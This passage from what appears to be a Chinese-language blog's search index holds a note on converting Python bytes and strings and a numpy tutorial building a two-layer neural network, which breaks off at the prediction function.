punctuation">&lt;/</span>dd</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dialog</span><span class="token punctuation">></span></span>   <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul></li><li><p><code>&lt;embed&gt;</code>  </p><ul><li><p>定义嵌入的内容,比如插件  </p></li><li><p><code>&lt;embed&gt;</code> 标签必须有 src 属性  </p><table><thead><tr><th align="center">属性</th><th align="center">值</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">height</td><td align="center">pixels</td><td align="center">设置嵌入式内容的高度</td></tr><tr><td align="center">src</td><td align="center">url</td><td align="center">定义嵌入内容的类型</td></tr><tr><td align="center">type</td><td align="center">type</td><td align="center">定义嵌入式内容的类型</td></tr><tr><td align="center">width</td><td align="center">pixels</td><td align="center">设置嵌入式内容的宽度</td></tr></tbody></table></li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> html </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>str-bytes</title>
      <link href="/2019/03/26/2019-str-bytes/"/>
      <url>/2019/03/26/2019-str-bytes/</url>
      
        <content type="html"><![CDATA[<p>PS: 这个坑踩了无数遍，填了它😀😜😜   </p><h2 id="python-字节型数据与字符串的转换"><a href="#python-字节型数据与字符串的转换" class="headerlink" title="python-字节型数据与字符串的转换"></a>python-字节型数据与字符串的转换</h2><h3 id="bytes-to-str"><a href="#bytes-to-str" class="headerlink" title="bytes to str"></a>bytes to str</h3><ul><li><p><code>str(bytes, encoding=&quot;utf-8&quot;)</code>  </p><pre class="line-numbers language-python"><code class="language-python">  In <span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">:</span> type<span class="token punctuation">(</span>b<span class="token punctuation">)</span>    Out<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">:</span> bytes    In <span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">:</span> c <span class="token operator">=</span> str<span class="token punctuation">(</span>b<span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span>    In <span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">:</span> type<span class="token punctuation">(</span>c<span class="token punctuation">)</span>    Out<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">:</span> str  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p><code>bytes.decode(bytes)</code>  </p><pre class="line-numbers language-python"><code class="language-python">  In <span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span><span class="token punctuation">:</span> type<span class="token punctuation">(</span>z<span class="token punctuation">)</span>    Out<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span><span class="token punctuation">:</span> bytes    In <span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span><span class="token punctuation">:</span> m <span class="token operator">=</span> bytes<span class="token punctuation">.</span>decode<span class="token punctuation">(</span>z<span class="token punctuation">)</span>    In <span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">:</span> type<span class="token punctuation">(</span>m<span class="token punctuation">)</span>    Out<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">:</span> str  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p><code>repr(bytes)</code>   </p><pre class="line-numbers language-python"><code class="language-python">  In <span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">:</span> a <span class="token operator">=</span> b<span class="token string">"12345"</span>     In <span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">:</span> type<span class="token punctuation">(</span>a<span class="token punctuation">)</span>     Out<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">:</span> bytes     In <span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token punctuation">:</span> b <span class="token operator">=</span> repr<span class="token punctuation">(</span>a<span class="token punctuation">)</span>     In <span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">:</span> type<span class="token punctuation">(</span>b<span class="token punctuation">)</span>     Out<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">:</span> str     In <span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span><span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span>     b<span class="token string">'12345'</span>   <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h3 id="str-to-bytes"><a href="#str-to-bytes" class="headerlink" title="str to bytes"></a>str to bytes</h3><ul><li><p><code>bytes(string, encoding=&#39;utf-8&#39;)</code>  </p><pre class="line-numbers language-python"><code class="language-python">  In <span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">:</span> type<span class="token punctuation">(</span>a<span class="token punctuation">)</span>    Out<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">:</span> str    In <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">:</span> b <span class="token operator">=</span> bytes<span class="token punctuation">(</span>a<span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span>    In <span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">:</span> type<span class="token punctuation">(</span>b<span class="token punctuation">)</span>    Out<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">:</span> bytes  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p><code>str.encode(str)</code>  </p><pre class="line-numbers language-python"><code class="language-python">  In <span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span><span class="token punctuation">:</span> type<span class="token punctuation">(</span>a<span class="token punctuation">)</span>    Out<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span><span class="token punctuation">:</span> str    In <span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span><span class="token punctuation">:</span> z <span class="token operator">=</span> str<span class="token punctuation">.</span>encode<span class="token punctuation">(</span>a<span class="token punctuation">)</span>    In <span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span><span class="token punctuation">:</span> type<span class="token punctuation">(</span>z<span class="token punctuation">)</span>    Out<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span><span class="token punctuation">:</span> bytes  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 填坑 </tag>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>神经网络</title>
      <link href="/2019/03/25/2019-shuang-ceng-shen-jing-wang-luo/"/>
      <url>/2019/03/25/2019-shuang-ceng-shen-jing-wang-luo/</url>
      
        <content type="html"><![CDATA[<p>///<a href="https://blog.csdn.net/u013733326/article/details/79702148" target="_blank" rel="noopener">参考资料中文</a>////<a href="https://github.com/Kulbear/deep-learning-coursera/blob/master/Neural%20Networks%20and%20Deep%20Learning/Planar%20data%20classification%20with%20one%20hidden%20layer.ipynb" target="_blank" rel="noopener">参考资料英文</a>///</p><h1 id="双层神经网络"><a href="#双层神经网络" class="headerlink" title="双层神经网络"></a>双层神经网络</h1><h2 id="模块导入"><a href="#模块导入" class="headerlink" title="模块导入"></a>模块导入</h2><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> numpy <span class="token keyword">as</span> np  <span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> plt  <span class="token keyword">import</span> sklearn  <span class="token keyword">import</span> sklearn<span class="token punctuation">.</span>datasets  <span class="token keyword">import</span> sklearn<span class="token punctuation">.</span>linear_model  <span class="token keyword">from</span> planar_utils <span class="token keyword">import</span> plot_decision_boundary<span class="token punctuation">,</span> sigmoid <span class="token punctuation">,</span> load_planar_dataset  <span class="token operator">%</span>matplotlib inline  np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>seed<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python"><code class="language-python">X<span class="token punctuation">,</span> Y <span class="token operator">=</span> load_planar_dataset<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#加载数据  </span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="数据可视化"><a href="#数据可视化" class="headerlink" title="数据可视化"></a>数据可视化</h2><pre class="line-numbers language-python"><code class="language-python">plt<span class="token punctuation">.</span>scatter<span class="token punctuation">(</span>X<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">,</span> X<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">,</span> c <span class="token operator">=</span> np<span class="token punctuation">.</span>squeeze<span class="token punctuation">(</span>Y<span class="token punctuation">)</span><span class="token punctuation">,</span> s <span class="token operator">=</span> <span class="token number">40</span><span class="token punctuation">,</span> cmap<span class="token operator">=</span>plt<span class="token punctuation">.</span>cm<span class="token punctuation">.</span>Spectral<span class="token punctuation">)</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre><code>&lt;matplotlib.collections.PathCollection at 0x1d800b7e6a0&gt;  </code></pre><p><img src="http://sowcar.com/t6/689/1553529150x720133442.png" alt="png">  </p><h2 id="数据分析"><a href="#数据分析" class="headerlink" title="数据分析"></a>数据分析</h2><pre class="line-numbers language-python"><code class="language-python">shape_X <span class="token operator">=</span> X<span class="token punctuation">.</span>shape  shape_Y <span class="token operator">=</span> Y<span class="token punctuation">.</span>shape  m <span class="token operator">=</span> Y<span class="token punctuation">.</span>shape<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>  <span class="token keyword">print</span><span class="token punctuation">(</span>shape_X<span class="token punctuation">)</span>  <span class="token keyword">print</span><span class="token punctuation">(</span>shape_Y<span class="token punctuation">)</span>  <span class="token keyword">print</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre><code>(2, 400)  (1, 400)  400  </code></pre><h2 id="神经搭建"><a href="#神经搭建" class="headerlink" title="神经搭建"></a>神经搭建</h2><h3 id="数据结构获取"><a href="#数据结构获取" class="headerlink" title="数据结构获取"></a>数据结构获取</h3><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">layer_size</span><span class="token punctuation">(</span>X<span class="token punctuation">,</span> Y<span class="token punctuation">)</span><span class="token punctuation">:</span>      n_x <span class="token operator">=</span> X<span class="token punctuation">.</span>shape<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>      n_h <span class="token operator">=</span> <span class="token number">4</span>      n_y <span class="token operator">=</span> Y<span class="token punctuation">.</span>shape<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>      <span class="token keyword">return</span> <span class="token punctuation">(</span>n_x<span class="token punctuation">,</span> n_h<span class="token punctuation">,</span> n_y<span class="token punctuation">)</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="参数初始化"><a href="#参数初始化" class="headerlink" title="参数初始化"></a>参数初始化</h3><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">initialize_parametiers</span><span class="token punctuation">(</span>n_x<span class="token punctuation">,</span> n_h<span class="token punctuation">,</span> n_y<span class="token punctuation">)</span><span class="token punctuation">:</span>      np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>seed<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>      W1 <span class="token operator">=</span> np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>randn<span class="token punctuation">(</span>n_h<span class="token punctuation">,</span> n_x<span class="token punctuation">)</span> <span class="token operator">*</span>  <span class="token number">0.01</span>      b1 <span class="token operator">=</span> np<span class="token punctuation">.</span>zeros<span class="token punctuation">(</span>shape<span class="token operator">=</span><span class="token punctuation">(</span>n_h<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>      W2 <span class="token operator">=</span> np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>randn<span class="token punctuation">(</span>n_y<span class="token punctuation">,</span> n_h<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">0.01</span>      b2 <span class="token operator">=</span> np<span class="token punctuation">.</span>zeros<span class="token punctuation">(</span>shape<span class="token operator">=</span><span class="token punctuation">(</span>n_y<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>      <span class="token keyword">assert</span><span class="token punctuation">(</span>W1<span class="token punctuation">.</span>shape <span class="token operator">==</span> <span class="token punctuation">(</span>n_h<span class="token punctuation">,</span> n_x<span class="token punctuation">)</span><span class="token punctuation">)</span>      <span class="token keyword">assert</span><span class="token punctuation">(</span>b1<span class="token punctuation">.</span>shape <span class="token operator">==</span> <span class="token punctuation">(</span>n_h<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>      <span class="token keyword">assert</span><span class="token punctuation">(</span>W2<span class="token punctuation">.</span>shape <span class="token operator">==</span> <span class="token punctuation">(</span>n_y<span class="token punctuation">,</span> n_h<span class="token punctuation">)</span><span class="token punctuation">)</span>      <span class="token keyword">assert</span><span class="token punctuation">(</span>b2<span class="token punctuation">.</span>shape <span class="token operator">==</span> <span class="token punctuation">(</span>n_y<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>      parameters <span class="token operator">=</span> <span class="token punctuation">{</span>          <span class="token string">"W1"</span> <span class="token punctuation">:</span> W1<span class="token punctuation">,</span>          <span class="token string">"b1"</span> <span class="token punctuation">:</span> b1<span class="token punctuation">,</span>          <span class="token string">"W2"</span> <span class="token punctuation">:</span> W2<span class="token punctuation">,</span>          <span class="token string">"b2"</span> <span class="token punctuation">:</span> b2      <span class="token punctuation">}</span>      <span class="token keyword">return</span> parameters  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="向前传播"><a href="#向前传播" class="headerlink" title="向前传播"></a>向前传播</h3><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">forward_propagation</span><span class="token punctuation">(</span>X<span class="token punctuation">,</span> parameters<span class="token punctuation">)</span><span class="token punctuation">:</span>      W1 <span class="token operator">=</span> parameters<span class="token punctuation">[</span><span class="token string">"W1"</span><span class="token punctuation">]</span>      b1 <span class="token operator">=</span> parameters<span class="token punctuation">[</span><span class="token string">"b1"</span><span class="token punctuation">]</span>      W2 <span class="token operator">=</span> parameters<span class="token punctuation">[</span><span class="token string">"W2"</span><span class="token punctuation">]</span>      b2 <span class="token operator">=</span> parameters<span class="token punctuation">[</span><span class="token string">"b2"</span><span class="token punctuation">]</span>      Z1 <span class="token operator">=</span> np<span class="token punctuation">.</span>dot<span class="token punctuation">(</span>W1<span class="token punctuation">,</span> X<span class="token punctuation">)</span> <span class="token operator">+</span> b1      A1 <span class="token operator">=</span> np<span class="token punctuation">.</span>tanh<span class="token punctuation">(</span>Z1<span class="token punctuation">)</span>      Z2 <span class="token operator">=</span> np<span class="token punctuation">.</span>dot<span class="token punctuation">(</span>W2<span class="token punctuation">,</span> A1<span class="token punctuation">)</span> <span class="token operator">+</span> b2      A2 <span class="token operator">=</span> sigmoid<span class="token punctuation">(</span>Z2<span class="token punctuation">)</span>      <span class="token keyword">assert</span><span class="token punctuation">(</span>A2<span class="token punctuation">.</span>shape <span class="token operator">==</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> X<span class="token punctuation">.</span>shape<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>      cache <span class="token operator">=</span> <span class="token punctuation">{</span>          <span class="token string">"Z1"</span> <span class="token punctuation">:</span> Z1<span class="token punctuation">,</span>          <span class="token string">"A1"</span> <span class="token punctuation">:</span> A1<span class="token punctuation">,</span>          <span class="token string">"Z2"</span> <span class="token punctuation">:</span> Z2<span class="token punctuation">,</span>          <span class="token string">"A2"</span> <span class="token punctuation">:</span> A2      <span class="token punctuation">}</span>      <span class="token keyword">return</span> <span class="token punctuation">(</span>A2<span class="token punctuation">,</span> cache<span class="token punctuation">)</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="计算成本函数"><a href="#计算成本函数" class="headerlink" title="计算成本函数"></a>计算成本函数</h3><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">compute_cost</span><span class="token punctuation">(</span>A2<span class="token punctuation">,</span> Y<span class="token punctuation">,</span> parameters<span class="token punctuation">)</span><span class="token punctuation">:</span>      m <span class="token operator">=</span> Y<span class="token punctuation">.</span>shape<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>      W1 <span class="token operator">=</span> parameters<span class="token punctuation">[</span><span class="token string">"W1"</span><span class="token punctuation">]</span>      W2 <span class="token operator">=</span> parameters<span class="token punctuation">[</span><span class="token string">"W2"</span><span class="token punctuation">]</span>      logprobs <span class="token operator">=</span> np<span class="token punctuation">.</span>multiply<span class="token punctuation">(</span>np<span class="token punctuation">.</span>log<span class="token punctuation">(</span>A2<span class="token punctuation">)</span><span class="token punctuation">,</span> Y<span class="token punctuation">)</span> <span class="token operator">+</span> np<span class="token punctuation">.</span>multiply<span class="token punctuation">(</span> np<span class="token punctuation">.</span>log<span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">-</span> A2<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">-</span> Y<span class="token punctuation">)</span><span class="token punctuation">)</span>      cost <span class="token operator">=</span> <span class="token operator">-</span>np<span class="token punctuation">.</span>sum<span class="token punctuation">(</span>logprobs<span class="token punctuation">)</span> <span class="token operator">/</span> m      cost <span class="token operator">=</span> float<span class="token punctuation">(</span>np<span class="token punctuation">.</span>squeeze<span class="token punctuation">(</span>cost<span class="token punctuation">)</span><span class="token punctuation">)</span>      <span class="token keyword">assert</span><span class="token punctuation">(</span>isinstance<span class="token punctuation">(</span>cost<span class="token punctuation">,</span> float<span class="token punctuation">)</span><span class="token punctuation">)</span>      <span class="token keyword">return</span> cost  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="反向传播"><a href="#反向传播" class="headerlink" title="反向传播"></a>反向传播</h3><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">backward_propagation</span><span class="token punctuation">(</span>parameters<span class="token punctuation">,</span> chche<span class="token punctuation">,</span> X<span class="token punctuation">,</span> Y<span class="token punctuation">)</span><span class="token punctuation">:</span>      m <span class="token operator">=</span> X<span class="token punctuation">.</span>shape<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>      W1 <span class="token operator">=</span> parameters<span class="token punctuation">[</span><span class="token string">"W1"</span><span class="token punctuation">]</span>      W2 <span class="token operator">=</span> parameters<span class="token punctuation">[</span><span class="token string">"W2"</span><span class="token punctuation">]</span>      A1 <span class="token operator">=</span> chche<span class="token punctuation">[</span><span class="token string">"A1"</span><span class="token punctuation">]</span>      A2 <span class="token operator">=</span> chche<span class="token punctuation">[</span><span class="token string">"A2"</span><span class="token punctuation">]</span>      dZ2 <span class="token operator">=</span> A2 <span class="token operator">-</span> Y      dW2 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">/</span> m<span class="token punctuation">)</span> <span class="token operator">*</span> np<span class="token punctuation">.</span>dot<span class="token punctuation">(</span>dZ2<span class="token punctuation">,</span> A1<span class="token punctuation">.</span>T<span class="token punctuation">)</span>      db2 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">/</span> m<span class="token punctuation">)</span> <span class="token operator">*</span> np<span class="token punctuation">.</span>sum<span class="token punctuation">(</span>dZ2<span class="token punctuation">,</span> axis<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> keepdims<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>      dZ1 <span class="token operator">=</span> np<span class="token punctuation">.</span>multiply<span class="token punctuation">(</span>np<span class="token punctuation">.</span>dot<span class="token punctuation">(</span>W2<span class="token punctuation">.</span>T<span class="token punctuation">,</span> dZ2<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span> <span class="token operator">-</span> np<span class="token punctuation">.</span>power<span class="token punctuation">(</span>A1<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>      dW1 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">/</span> m<span class="token punctuation">)</span> <span class="token operator">*</span> np<span class="token punctuation">.</span>dot<span class="token punctuation">(</span>dZ1<span class="token punctuation">,</span> X<span class="token punctuation">.</span>T<span class="token punctuation">)</span>      db1 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">/</span> m<span class="token punctuation">)</span> <span class="token operator">*</span> np<span class="token punctuation">.</span>sum<span class="token punctuation">(</span>dZ1<span class="token punctuation">,</span> axis<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> keepdims<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>      grads <span class="token operator">=</span> <span class="token punctuation">{</span>          <span class="token string">"dW1"</span> <span class="token punctuation">:</span> dW1<span class="token punctuation">,</span>          <span class="token string">"db1"</span> <span class="token punctuation">:</span> db1<span class="token punctuation">,</span>          <span class="token string">"dW2"</span> <span class="token punctuation">:</span> dW2<span class="token punctuation">,</span>          <span class="token string">"db2"</span> <span class="token punctuation">:</span> db2      <span class="token punctuation">}</span>      <span class="token keyword">return</span> grads  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="更新参数"><a href="#更新参数" class="headerlink" title="更新参数"></a>更新参数</h3><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">update_parameters</span><span class="token punctuation">(</span>parameters<span class="token punctuation">,</span> grads<span class="token punctuation">,</span> learning_rate<span class="token operator">=</span><span class="token number">1.2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>      W1<span class="token punctuation">,</span> W2 <span class="token operator">=</span> parameters<span class="token punctuation">[</span><span class="token string">"W1"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> parameters<span class="token punctuation">[</span><span class="token string">"W2"</span><span class="token punctuation">]</span>      b1<span class="token punctuation">,</span> b2 <span class="token operator">=</span> parameters<span class="token punctuation">[</span><span class="token string">"b1"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> parameters<span class="token punctuation">[</span><span class="token string">"b2"</span><span class="token punctuation">]</span>      dW1<span class="token punctuation">,</span> dW2 <span class="token operator">=</span> grads<span class="token punctuation">[</span><span class="token string">"dW1"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> grads<span class="token punctuation">[</span><span class="token string">"dW2"</span><span class="token punctuation">]</span>      db1<span class="token punctuation">,</span> db2 <span class="token operator">=</span> grads<span class="token punctuation">[</span><span class="token string">"db1"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> grads<span class="token punctuation">[</span><span class="token string">"db2"</span><span class="token punctuation">]</span>      W1 <span class="token operator">=</span> W1 <span class="token operator">-</span> learning_rate <span class="token operator">*</span> dW1      b1 <span class="token operator">=</span> b1 <span class="token operator">-</span> learning_rate <span class="token operator">*</span> db1      W2 <span class="token operator">=</span> W2 <span class="token operator">-</span> learning_rate <span class="token operator">*</span> dW2      b2 <span class="token operator">=</span> b2 <span class="token operator">-</span> learning_rate <span class="token operator">*</span> db2      parameters <span class="token operator">=</span> <span class="token punctuation">{</span>          <span class="token string">"W1"</span> <span class="token punctuation">:</span> W1<span class="token punctuation">,</span>          <span class="token string">"b1"</span> <span class="token punctuation">:</span> b1<span class="token punctuation">,</span>          <span class="token string">"W2"</span> <span class="token punctuation">:</span> W2<span class="token punctuation">,</span>          <span class="token string">"b2"</span> <span class="token punctuation">:</span> b2      <span class="token punctuation">}</span>      <span class="token keyword">return</span> parameters  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="整合"><a href="#整合" class="headerlink" title="整合"></a>整合</h3><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">nn_model</span><span class="token punctuation">(</span>X<span class="token punctuation">,</span> Y<span class="token punctuation">,</span> n_h<span class="token punctuation">,</span> num_iterations<span class="token punctuation">,</span> learning_rate<span class="token operator">=</span><span class="token number">0.5</span><span class="token punctuation">,</span> print_cost<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span class="token punctuation">:</span>      np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>seed<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>      n_x<span class="token punctuation">,</span> n_y <span class="token operator">=</span> layer_size<span class="token punctuation">(</span>X<span class="token punctuation">,</span> Y<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> layer_size<span class="token punctuation">(</span>X<span class="token punctuation">,</span> Y<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span>      parameters <span class="token operator">=</span> initialize_parametiers<span class="token punctuation">(</span>n_x<span class="token punctuation">,</span> n_h<span class="token punctuation">,</span> n_y<span class="token punctuation">)</span>      W1<span class="token punctuation">,</span> b1 <span class="token operator">=</span> parameters<span class="token punctuation">[</span><span class="token string">"W1"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> parameters<span class="token punctuation">[</span><span class="token string">"b1"</span><span class="token punctuation">]</span>      W2<span class="token punctuation">,</span> b2 <span class="token operator">=</span> parameters<span class="token punctuation">[</span><span class="token string">"W2"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> parameters<span class="token punctuation">[</span><span class="token string">"b2"</span><span class="token punctuation">]</span>      <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>num_iterations<span class="token punctuation">)</span><span class="token punctuation">:</span>          A2<span class="token punctuation">,</span> cache <span class="token operator">=</span> forward_propagation<span class="token punctuation">(</span>X<span class="token punctuation">,</span> parameters<span class="token punctuation">)</span>          cost <span class="token operator">=</span> compute_cost<span class="token punctuation">(</span>A2<span class="token punctuation">,</span> Y<span class="token punctuation">,</span> parameters<span class="token punctuation">)</span>          grads <span class="token operator">=</span> backward_propagation<span class="token punctuation">(</span>parameters<span class="token punctuation">,</span> cache<span class="token punctuation">,</span> X<span class="token punctuation">,</span> Y<span class="token punctuation">)</span>          parameters <span class="token operator">=</span> update_parameters<span class="token punctuation">(</span>parameters<span class="token punctuation">,</span> grads<span class="token punctuation">,</span> learning_rate<span class="token punctuation">)</span>          <span class="token keyword">if</span> print_cost<span class="token punctuation">:</span>              <span class="token keyword">if</span> i <span class="token operator">%</span> <span class="token number">1000</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>                  <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"第%d次循环， 成本为：%s"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>i<span class="token punctuation">,</span> str<span class="token punctuation">(</span>cost<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>      <span class="token keyword">return</span> parameters  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="构建预测"><a href="#构建预测" class="headerlink" title="构建预测"></a>构建预测</h3><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">predict</span><span class="token punctuation">(</span>parameters<span 